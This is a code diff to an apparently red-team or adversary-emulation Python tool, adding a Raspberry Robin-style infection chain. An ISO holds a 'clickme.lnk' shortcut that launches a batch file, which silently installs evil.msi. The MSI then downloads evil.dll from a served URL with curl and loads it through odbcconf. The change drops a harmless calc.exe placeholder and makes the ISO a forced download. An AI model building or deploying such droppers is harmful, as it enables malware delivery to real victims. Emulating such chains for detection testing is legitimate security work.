@@ -7,6 +7,7 @@ from make.rar.rar import makeRar
 from make.msi.msi import *
 from make.powershell.powershell import *
 from make.iso.iso import makeIso
+from make.cmd.cmd import *
 
 from helpers import *
 from model import AceFile, AceRoute
@@ -14,24 +15,32 @@ from model import AceFile, AceRoute
 
 def raspberryrobin(baseUrl) -> List[AceRoute]:
     routes = []
-    # LNK -> CMD -> BAT -> MSIEXEC:downloadDLL -> odbcconf/rundll32:dll
+    # LNK -> CMD -> BAT -> MSIEXEC:CMD: (downloadDLL -> odbcconf/rundll32:dll)
 
-    # msi: stage 2
-    cmd = "{}; {};".format(
-        makeCmdFileDownloadWithCurl(),
-        makeCmdToDllWithOdbc(),
+    # DLL: Payload
+    evilDll: AceBytes = readFileContent('payloads/evil.dll')
+    evilDllroute = AceRoute('/evil.dll', evilDll)
+    routes.append(evilDllroute)
+
+    # MSI: stage 2
+    cmd = "cmd /c \"{} & {}\"".format(
+        makeCmdFileDownloadWithCurl(
+            url=baseUrl + '/evil.dll', 
+            destinationFile='%tmp%\\evil.dll'),
+        makeCmdToDllWithOdbc(
+            dllPath='%tmp%\\evil.dll'
+        ),
     )
+    logger.info("Stage 2 cmdline: " + cmd)
     msi = makeMsiFromCmd(cmd)
     msiFile = AceFile("evil.msi", msi)
-    #msiRoute = AceRoute('/evil.msi', msiFile)
-    #routes.append(msiRoute)
 
-    # bat: stage 1: make sure each line ends with \r\n, or it will not work
-    bat = AceBytes(b"calc.exe\r\nmsiexec.exe /q /i evil.msi\r\n")
+    # BAT: stage 1: make sure each line ends with \r\n, or it will not work
+    bat = AceBytes(b"msiexec.exe /q /i evil.msi\r\n")
     batFile = makeAceFile('evil.bat', bat)
 
-    # LNK cmd using "/r cmd file.bat" < technique with file.bat
-    # in the same directory (iso)
+    # LNK cmd using "/r cmd <file.bat" technique
+    # file.bat is in the same directory as the lnk (iso)
     lnkData: AceBytes = makeLnk(
         name = "clickme.lnk",
         target = "c:\\windows\\system32\\cmd.exe",
@@ -46,7 +55,7 @@ def raspberryrobin(baseUrl) -> List[AceRoute]:
         msiFile,
     ])
     containerFile: AceFile = makeAceFile('test.iso', container)
-    isoRoute: AceRoute = AceRoute('/test', container)
+    isoRoute: AceRoute = AceRoute('/test.iso', container, download=True, downloadName='test.iso')
     routes.append(isoRoute)
 
     return routes
